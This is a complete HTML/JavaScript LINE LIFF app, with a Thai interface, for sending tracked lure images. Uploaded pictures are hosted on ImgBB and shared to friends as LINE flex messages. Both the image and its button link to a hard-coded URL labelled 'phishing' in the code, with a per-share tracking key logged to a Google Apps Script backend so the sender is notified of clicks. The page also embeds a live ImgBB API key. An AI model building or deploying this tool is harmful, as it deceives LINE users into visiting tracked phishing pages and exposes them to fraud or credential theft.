<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Share - LIFF App</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Add your custom styles -->
    <style>
        body {
            font-family: 'Prompt', sans-serif;
            background-color: #f0f2f5;
            color: #333;
        }
        
        .container {
            max-width: 600px;
            padding-top: 20px;
            padding-bottom: 70px;
        }
        
        .card {
            border-radius: 15px;
            border: none;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
            overflow: hidden;
        }
        
        .card-header {
            background: linear-gradient(135deg, #06c755, #00B900);
            color: white;
            border: none;
            padding: 15px 20px;
            font-weight: bold;
        }
        
        .preview-container {
            position: relative;
            width: 100%;
            height: 0;
            padding-bottom: 56.25%;
            background-color: #f8f9fa;
            border-radius: 10px;
            overflow: hidden;
            margin: 15px 0;
            display: none;
        }
        
        #imagePreview {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
        
        .drag-area {
            border: 2px dashed #06c755;
            height: 180px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            margin: 20px 0;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .drag-area:hover {
            border-color: #00B900;
            background-color: rgba(6, 199, 85, 0.05);
        }
        
        .drag-area .icon {
            font-size: 50px;
            color: #06c755;
        }
        
        .drag-area header {
            font-size: 16px;
            font-weight: 500;
            color: #333;
        }
        
        .drag-area span {
            font-size: 14px;
            font-weight: 400;
            color: #666;
            margin: 10px 0 15px 0;
        }
        
        .btn-primary {
            background-color: #06c755;
            border-color: #06c755;
            padding: 10px 20px;
            font-weight: bold;
            border-radius: 8px;
        }
        
        .btn-primary:hover, .btn-primary:focus {
            background-color: #00B900;
            border-color: #00B900;
        }
        
        .btn-outline-primary {
            color: #06c755;
            border-color: #06c755;
            padding: 10px 20px;
            font-weight: bold;
            border-radius: 8px;
        }
        
        .btn-outline-primary:hover, .btn-outline-primary:focus {
            background-color: #06c755;
            color: white;
        }
        
        #loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.8);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        
        .spinner-border {
            width: 3rem;
            height: 3rem;
            color: #06c755;
        }
        
        .profile-card {
            display: flex;
            align-items: center;
            padding: 15px 20px;
        }
        
        .profile-picture {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            object-fit: cover;
            border: 3px solid #06c755;
        }
        
        .profile-info {
            margin-left: 15px;
        }
        
        .profile-name {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 3px;
        }
        
        .profile-status {
            font-size: 14px;
            color: #666;
        }
        
        .profile-status.approved {
            color: #06c755;
        }
        
        .profile-status.pending {
            color: #ffc107;
        }
        
        .profile-status i {
            margin-right: 5px;
        }
        
        .steps {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
            position: relative;
        }
        
        .steps::before {
            content: '';
            position: absolute;
            background: #ddd;
            height: 4px;
            width: 100%;
            top: 50%;
            transform: translateY(-50%);
            z-index: 0;
        }
        
        .step {
            background-color: white;
            border-radius: 50%;
            height: 40px;
            width: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            z-index: 1;
            border: 2px solid #ddd;
            font-weight: bold;
            color: #666;
        }
        
        .step.active {
            background-color: #06c755;
            border-color: #06c755;
            color: white;
        }
        
        .step.completed {
            background-color: #06c755;
            border-color: #06c755;
            color: white;
        }
        
        .alert {
            border-radius: 8px;
        }
        
        footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            background-color: white;
            border-top: 1px solid #ddd;
            padding: 10px 0;
            z-index: 100;
        }
        
        .btn-lg {
            width: 100%;
        }
        
        .form-label {
            font-weight: 500;
        }
        
        .form-control {
            border-radius: 8px;
            padding: 10px 15px;
        }

        .form-control:focus {
            border-color: #06c755;
            box-shadow: 0 0 0 0.25rem rgba(6, 199, 85, 0.25);
        }
        
        .file-input-wrapper {
            position: relative;
            overflow: hidden;
            display: inline-block;
        }
        
        .file-input-wrapper input[type=file] {
            position: absolute;
            left: 0;
            top: 0;
            opacity: 0;
            width: 100%;
            height: 100%;
            cursor: pointer;
        }
        
        .step-text {
            text-align: center;
            font-size: 12px;
            color: #666;
            margin-top: 5px;
        }
        
        .img-result {
            max-width: 100%;
            border-radius: 10px;
            margin-bottom: 15px;
        }
        
        #shareResult {
            margin-top: 20px;
            display: none;
        }
    </style>
    <!-- Import LINE LIFF SDK -->
    <script charset="utf-8" src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
</head>
<body>
    <!-- Loading Overlay -->
    <div id="loading">
        <div class="spinner-border" role="status"></div>
        <p class="mt-3">กำลังโหลด...</p>
    </div>

    <div class="container" id="appContent" style="display: none;">
        <!-- Step Indicators -->
        <div class="steps">
            <div class="step active">1</div>
            <div class="step">2</div>
            <div class="step">3</div>
        </div>
        <div class="d-flex justify-content-between mb-4">
            <div class="step-text">เลือกภาพ</div>
            <div class="step-text">ใส่ข้อมูล</div>
            <div class="step-text">แชร์</div>
        </div>
        
        <!-- User Profile Card -->
        <div class="card mb-4">
            <div class="profile-card">
                <img id="profilePicture" src="https://via.placeholder.com/60" alt="Profile Picture" class="profile-picture">
                <div class="profile-info">
                    <div id="profileName" class="profile-name">กำลังโหลด...</div>
                    <div id="profileStatus" class="profile-status">
                        <i class="fas fa-circle-notch fa-spin"></i> กำลังตรวจสอบ...
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Not Authorized Alert -->
        <div id="notAuthorizedAlert" class="alert alert-warning" role="alert" style="display: none;">
            <i class="fas fa-exclamation-circle"></i> คุณยังไม่ได้รับอนุญาตให้ใช้งานฟีเจอร์นี้ กรุณาติดต่อผู้ดูแลระบบ
        </div>

        <!-- Step 1: Upload Image -->
        <div id="step1" class="card">
            <div class="card-header">
                <i class="fas fa-image me-2"></i> เลือกรูปภาพ
            </div>
            <div class="card-body">
                <p class="card-text">อัพโหลดรูปภาพที่คุณต้องการแชร์ไปยังเพื่อน</p>
                <div class="drag-area" id="dragArea">
                    <div class="icon"><i class="fas fa-cloud-upload-alt"></i></div>
                    <header>ลากและวางไฟล์ที่นี่</header>
                    <span>หรือ</span>
                    <div class="file-input-wrapper">
                        <button type="button" class="btn btn-outline-primary">เลือกไฟล์</button>
                        <input type="file" id="fileInput" accept="image/*">
                    </div>
                </div>
                
                <div class="preview-container" id="previewContainer">
                    <img id="imagePreview" src="#" alt="Image Preview">
                </div>
                
                <div class="mt-3 d-flex justify-content-between">
                    <button type="button" class="btn btn-outline-secondary" onclick="resetImage()">
                        <i class="fas fa-undo me-2"></i>ยกเลิก
                    </button>
                    <button type="button" id="continueBtn" class="btn btn-primary" disabled>
                        ต่อไป <i class="fas fa-arrow-right ms-2"></i>
                    </button>
                </div>
            </div>
        </div>

        <!-- Step 2: Add Case Info -->
        <div id="step2" class="card" style="display: none;">
            <div class="card-header">
                <i class="fas fa-info-circle me-2"></i> ข้อมูลเคส
            </div>
            <div class="card-body">
                <div class="mb-3">
                    <label for="caseName" class="form-label">ชื่อเคส</label>
                    <input type="text" class="form-control" id="caseName" placeholder="ระบุชื่อเคส">
                </div>
                <div class="mb-3">
                    <label for="targetUrl" class="form-label">URL ปลายทาง (เลือกได้)</label>
                    <input type="text" class="form-control" id="targetUrl" placeholder="https://example.com">
                    <small class="text-muted">*หากไม่ระบุจะใช้ URL ฟิชชิ่งเริ่มต้น</small>
                </div>
                <div class="mt-3 d-flex justify-content-between">
                    <button type="button" class="btn btn-outline-secondary" onclick="backToStep1()">
                        <i class="fas fa-arrow-left me-2"></i>ย้อนกลับ
                    </button>
                    <button type="button" id="generateLinkBtn" class="btn btn-primary">
                        สร้างลิงก์ <i class="fas fa-link ms-2"></i>
                    </button>
                </div>
            </div>
        </div>

        <!-- Step 3: Share -->
        <div id="step3" class="card" style="display: none;">
            <div class="card-header">
                <i class="fas fa-share-alt me-2"></i> แชร์รูปภาพ
            </div>
            <div class="card-body">
                <div class="text-center">
                    <img id="finalImage" class="img-result" src="">
                    <p><strong>Tracking Key:</strong> <span id="trackingKeyDisplay">-</span></p>
                    <p><strong>ชื่อเคส:</strong> <span id="caseNameDisplay">-</span></p>
                </div>
                
                <div class="alert alert-info" role="alert">
                    <i class="fas fa-info-circle me-2"></i> เมื่อมีผู้คลิกรูปภาพนี้ ระบบจะส่งการแจ้งเตือนมายังคุณ
                </div>
                
                <div class="d-grid gap-2">
                    <button id="shareBtn" class="btn btn-primary">
                        <i class="fas fa-share-alt me-2"></i>แชร์ไปยังเพื่อน
                    </button>
                    <button id="newImageBtn" class="btn btn-outline-primary">
                        <i class="fas fa-plus me-2"></i>สร้างใหม่
                    </button>
                </div>
                
                <div id="shareResult" class="alert alert-success">
                    <i class="fas fa-check-circle me-2"></i> แชร์สำเร็จ!
                </div>
            </div>
        </div>
    </div>

    <footer id="footerBar" style="display: none;">
        <div class="container">
            <div class="d-grid">
                <button id="mainActionBtn" class="btn btn-primary btn-lg" disabled>
                    กรุณาเลือกรูปภาพก่อน
                </button>
            </div>
        </div>
    </footer>

    <!-- Bootstrap Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <!-- Main JavaScript -->
    <script>
        // Global variables
        let myLiffId = "YOUR_LIFF_ID"; // Replace with your actual LIFF ID
        let selectedFile = null;
        let imageUrl = "";
        let trackingKey = "";
        let userId = "";
        let displayName = "";
        let profilePicture = "";
        let isAuthorized = false;

        const imgbbApiKey = "32e34def85cc5116145d1e6f91ef23f6"; // ImgBB API Key
        const phishingBaseUrl = "https://socialtopnews.github.io/news/?daily=";
        
        // Initialize the application
        document.addEventListener("DOMContentLoaded", function() {
            // Initialize LIFF
            initializeLiff();
            
            // Set up event listeners
            setupEventListeners();
        });

        // Initialize LIFF
        function initializeLiff() {
            liff.init({
                liffId: myLiffId
            }).then(() => {
                // Check if user is logged in
                if (!liff.isLoggedIn()) {
                    liff.login();
                } else {
                    // Get user profile and check permissions
                    getUserProfile();
                }
            }).catch((err) => {
                console.error("LIFF initialization failed", err);
                showError("ไม่สามารถเริ่มต้น LIFF ได้ โปรดลองอีกครั้งในภายหลัง");
            });
        }

        // Get user profile and verify permissions
        function getUserProfile() {
            liff.getProfile()
                .then(profile => {
                    userId = profile.userId;
                    displayName = profile.displayName;
                    profilePicture = profile.pictureUrl || 'https://via.placeholder.com/60';
                    
                    // Update UI with profile information
                    document.getElementById('profileName').textContent = displayName;
                    document.getElementById('profilePicture').src = profilePicture;
                    
                    // Check if user is authorized
                    checkUserAuthorization(userId);
                })
                .catch((err) => {
                    console.error("Error getting user profile", err);
                    showError("ไม่สามารถดึงข้อมูลโปรไฟล์ได้");
                });
        }

        // Check if user is authorized
        function checkUserAuthorization(userId) {
            // Replace with your actual authorization endpoint
            // Note: You need to implement this server-side function that connects to your Google Sheets
            fetch(`https://script.google.com/macros/s/AKfycbydls9VdR40-hUr_2uCGz7WXubw94sXLWVjUnd9Orh5vOAuarKfwSYvYI_ZpXKMvK13gg/exec?action=checkPermission&userId=${userId}`)
                .then(response => response.json())
                .then(data => {
                    isAuthorized = data.hasPermission;
                    
                    // Update UI based on authorization
                    const profileStatus = document.getElementById('profileStatus');
                    
                    if (isAuthorized) {
                        profileStatus.innerHTML = '<i class="fas fa-check-circle"></i> อนุมัติแล้ว';
                        profileStatus.classList.add('approved');
                        document.getElementById('notAuthorizedAlert').style.display = 'none';
                    } else {
                        profileStatus.innerHTML = '<i class="fas fa-exclamation-circle"></i> รอการอนุมัติ';
                        profileStatus.classList.add('pending');
                        document.getElementById('notAuthorizedAlert').style.display = 'block';
                    }
                    
                    // Show application content and hide loading
                    document.getElementById('loading').style.display = 'none';
                    document.getElementById('appContent').style.display = 'block';
                    document.getElementById('footerBar').style.display = 'block';
                })
                .catch(error => {
                    console.error("Error checking user authorization", error);
                    document.getElementById('loading').style.display = 'none';
                    document.getElementById('appContent').style.display = 'block';
                    showError("ไม่สามารถตรวจสอบการอนุญาตใช้งานได้");
                });
        }

        // Setup event listeners
        function setupEventListeners() {
            // File Input change
            document.getElementById('fileInput').addEventListener('change', handleFileSelection);
            
            // Drag and drop events
            const dragArea = document.getElementById('dragArea');
            
            ['dragover', 'dragleave', 'drop'].forEach(eventName => {
                dragArea.addEventListener(eventName, preventDefaults, false);
            });
            
            function preventDefaults(e) {
                e.preventDefault();
                e.stopPropagation();
            }
            
            dragArea.addEventListener('dragover', function() {
                this.style.borderColor = '#00B900';
                this.style.backgroundColor = 'rgba(6, 199, 85, 0.1)';
            });
            
            dragArea.addEventListener('dragleave', function() {
                this.style.borderColor = '#06c755';
                this.style.backgroundColor = 'transparent';
            });
            
            dragArea.addEventListener('drop', function(e) {
                this.style.borderColor = '#06c755';
                this.style.backgroundColor = 'transparent';
                
                const dt = e.dataTransfer;
                const files = dt.files;
                
                if (files.length) {
                    handleFiles(files);
                }
            });
            
            // Button click events
            document.getElementById('continueBtn').addEventListener('click', function() {
                goToStep(2);
            });
            
            document.getElementById('generateLinkBtn').addEventListener('click', function() {
                generateTrackingLink();
            });
            
            document.getElementById('shareBtn').addEventListener('click', function() {
                shareImage();
            });
            
            document.getElementById('newImageBtn').addEventListener('click', function() {
                resetForm();
            });
            
            document.getElementById('mainActionBtn').addEventListener('click', function() {
                const currentStep = getCurrentStep();
                
                if (currentStep === 1 && selectedFile) {
                    goToStep(2);
                } else if (currentStep === 2) {
                    generateTrackingLink();
                } else if (currentStep === 3) {
                    shareImage();
                }
            });
        }

        // File handling functions
        function handleFileSelection() {
            const fileInput = document.getElementById('fileInput');
            if (fileInput.files.length > 0) {
                handleFiles(fileInput.files);
            }
        }
        
        function handleFiles(files) {
            if (!isAuthorized) {
                showError("คุณไม่มีสิทธิ์ใช้งานฟีเจอร์นี้");
                return;
            }
            
            selectedFile = files[0];
            
            if (!selectedFile.type.match('image.*')) {
                showError("กรุณาเลือกไฟล์รูปภาพเท่านั้น");
                resetImage();
                return;
            }
            
            const reader = new FileReader();
            
            reader.onload = function(e) {
                document.getElementById('imagePreview').src = e.target.result;
                document.getElementById('previewContainer').style.display = 'block';
                document.getElementById('continueBtn').disabled = false;
                document.getElementById('mainActionBtn').disabled = false;
                document.getElementById('mainActionBtn').textContent = 'ต่อไป';
            }
            
            reader.readAsDataURL(selectedFile);
        }
        
        function resetImage() {
            selectedFile = null;
            document.getElementById('fileInput').value = '';
            document.getElementById('imagePreview').src = '#';
            document.getElementById('previewContainer').style.display = 'none';
            document.getElementById('continueBtn').disabled = true;
            document.getElementById('mainActionBtn').disabled = true;
            document.getElementById('mainActionBtn').textContent = 'กรุณาเลือกรูปภาพก่อน';
        }

        // Navigation functions
        function getCurrentStep() {
            if (document.getElementById('step1').style.display !== 'none') {
                return 1;
            } else if (document.getElementById('step2').style.display !== 'none') {
                return 2;
            } else {
                return 3;
            }
        }
        
        function goToStep(stepNumber) {
            // Hide all steps
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'none';
            document.getElementById('step3').style.display = 'none';
            
            // Show the requested step
            document.getElementById('step' + stepNumber).style.display = 'block';
            
            // Update step indicators
            const steps = document.querySelectorAll('.step');
            steps.forEach((step, index) => {
                if (index + 1 < stepNumber) {
                    step.classList.remove('active');
                    step.classList.add('completed');
                    step.innerHTML = '<i class="fas fa-check"></i>';
                } else if (index + 1 === stepNumber) {
                    step.classList.add('active');
                    step.classList.remove('completed');
                    step.textContent = index + 1;
                } else {
                    step.classList.remove('active', 'completed');
                    step.textContent = index + 1;
                }
            });
            
            // Update footer button
            const mainActionBtn = document.getElementById('mainActionBtn');
            
            if (stepNumber === 1) {
                mainActionBtn.textContent = selectedFile ? 'ต่อไป' : 'กรุณาเลือกรูปภาพก่อน';
                mainActionBtn.disabled = !selectedFile;
            } else if (stepNumber === 2) {
                mainActionBtn.textContent = 'สร้างลิงก์';
                mainActionBtn.disabled = false;
            } else {
                mainActionBtn.textContent = 'แชร์ไปยังเพื่อน';
                mainActionBtn.disabled = false;
            }
        }
        
        function backToStep1() {
            goToStep(1);
        }

        // Generate tracking link and upload image
        function generateTrackingLink() {
            if (!selectedFile) {
                showError("กรุณาเลือกรูปภาพก่อน");
                return;
            }
            
            const caseName = document.getElementById('caseName').value.trim();
            if (!caseName) {
                showError("กรุณาระบุชื่อเคส");
                return;
            }
            
            showLoading("กำลังอัพโหลดรูปภาพ...");
            
            // Generate tracking key
            trackingKey = generateSimpleTrackingKey();
            
            // Upload image to ImgBB
            uploadImageToImgBB(selectedFile, trackingKey)
                .then(imgbbUrl => {
                    // Save tracking key and case name to your system
                    return saveTrackingCaseMapping(trackingKey, caseName, userId, displayName, imgbbUrl);
                })
                .then(() => {
                    // Update UI with result
                    document.getElementById('trackingKeyDisplay').textContent = trackingKey;
                    document.getElementById('caseNameDisplay').textContent = caseName;
                    document.getElementById('finalImage').src = imageUrl;
                    
                    hideLoading();
                    goToStep(3);
                })
                .catch(error => {
                    console.error("Error generating link", error);
                    hideLoading();
                    showError("เกิดข้อผิดพลาดในการสร้างลิงก์");
                });
        }

        // Upload image to ImgBB
        function uploadImageToImgBB(file, trackingKey) {
            return new Promise((resolve, reject) => {
                const formData = new FormData();
                formData.append('image', file);
                formData.append('key', imgbbApiKey);
                
                fetch('https://api.imgbb.com/1/upload', {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        // Store the direct image URL
                        imageUrl = data.data.url;
                        
                        // Get URL for redirection (target URL or default phishing URL)
                        const targetUrl = document.getElementById('targetUrl').value.trim();
                        const redirectUrl = targetUrl || phishingBaseUrl + trackingKey;
                        
                        // For ImgBB, we can't embed links directly in the image
                        // We'll return the image URL for sharing, and when someone views the image and clicks,
                        // they'll go to the phishing site
                        resolve(data.data.url);
                    } else {
                        reject(new Error("ImgBB upload failed"));
                    }
                })
                .catch(error => {
                    console.error("Error uploading to ImgBB", error);
                    reject(error);
                });
            });
        }

        // Save tracking key and case name to Google Sheets (via Google Apps Script)
        function saveTrackingCaseMapping(trackingKey, caseName, userId, displayName, imageUrl) {
            return new Promise((resolve, reject) => {
                // Call your Google Apps Script Web App to save data
                fetch('https://script.google.com/macros/s/AKfycbydls9VdR40-hUr_2uCGz7WXubw94sXLWVjUnd9Orh5vOAuarKfwSYvYI_ZpXKMvK13gg/exec', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        action: 'saveTracking',
                        trackingKey: trackingKey,
                        caseName: caseName,
                        userId: userId,
                        displayName: displayName,
                        source: 'liff-image',
                        imageUrl: imageUrl
                    })
                })
                .then(response => {
                    if (response.ok) {
                        resolve();
                    } else {
                        throw new Error("Failed to save tracking information");
                    }
                })
                .catch(error => {
                    console.error("Error saving tracking data", error);
                    reject(error);
                });
            });
        }

        // Generate simple tracking key
        function generateSimpleTrackingKey() {
            // Generate timestamp in base36
            const timestamp = Date.now().toString(36);
            
            // Generate 4 random characters
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let randomPart = '';
            for (let i = 0; i < 4; i++) {
                randomPart += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            
            // Combine as tracking key: timestamp-random-img
            return timestamp + '-' + randomPart + '-img';
        }

        // Share image using LINE Share Target Picker
        function shareImage() {
            if (!imageUrl) {
                showError("ไม่พบรูปภาพที่จะแชร์");
                return;
            }

            if (liff.isApiAvailable('shareTargetPicker')) {
                // Prepare the message to share
                const message = {
                    "type": "flex",
                    "altText": "ดูรูปภาพนี้",
                    "contents": {
                        "type": "bubble",
                        "hero": {
                            "type": "image",
                            "url": imageUrl,
                            "size": "full",
                            "aspectRatio": "1:1",
                            "aspectMode": "cover",
                            "action": {
                                "type": "uri",
                                "uri": phishingBaseUrl + trackingKey // This is the phishing link
                            }
                        },
                        "body": {
                            "type": "box",
                            "layout": "vertical",
                            "contents": [
                                {
                                    "type": "text",
                                    "text": "คลิกที่รูปภาพเพื่อดูเพิ่มเติม",
                                    "weight": "bold",
                                    "size": "md",
                                    "align": "center",
                                    "wrap": true
                                }
                            ],
                            "spacing": "md",
                            "paddingAll": "12px"
                        },
                        "footer": {
                            "type": "box",
                            "layout": "vertical",
                            "contents": [
                                {
                                    "type": "button",
                                    "style": "primary",
                                    "action": {
                                        "type": "uri",
                                        "label": "ดูรูปภาพ",
                                        "uri": phishingBaseUrl + trackingKey // Same phishing link
                                    }
                                }
                            ]
                        }
                    }
                };

                // Launch share target picker
                showLoading("กำลังเปิดเมนูแชร์...");
                
                liff.shareTargetPicker([message])
                    .then(result => {
                        hideLoading();
                        if (result) {
                            document.getElementById('shareResult').style.display = 'block';
                            document.getElementById('shareBtn').disabled = true;
                        } else {
                            // User canceled share target picker
                            console.log("User canceled ShareTargetPicker");
                        }
                    })
                    .catch(error => {
                        console.error("Error launching share target picker", error);
                        hideLoading();
                        showError("ไม่สามารถเปิดเมนูแชร์ได้");
                    });
            } else {
                showError("แอปพลิเคชันไม่รองรับการแชร์");
            }
        }

        // Reset form and go back to step 1
        function resetForm() {
            resetImage();
            document.getElementById('caseName').value = '';
            document.getElementById('targetUrl').value = '';
            document.getElementById('imagePreview').src = '#';
            document.getElementById('finalImage').src = '';
            document.getElementById('trackingKeyDisplay').textContent = '-';
            document.getElementById('caseNameDisplay').textContent = '-';
            document.getElementById('shareResult').style.display = 'none';
            document.getElementById('shareBtn').disabled = false;
            trackingKey = '';
            imageUrl = '';
            goToStep(1);
        }

        // Helper functions for UI
        function showLoading(message = "กำลังดำเนินการ...") {
            document.getElementById('loading').querySelector('p').textContent = message;
            document.getElementById('loading').style.display = 'flex';
        }
        
        function hideLoading() {
            document.getElementById('loading').style.display = 'none';
        }
        
        function showError(message) {
            alert(message); // Simple error handler, can be improved
        }
    </script>
</body>
</html>
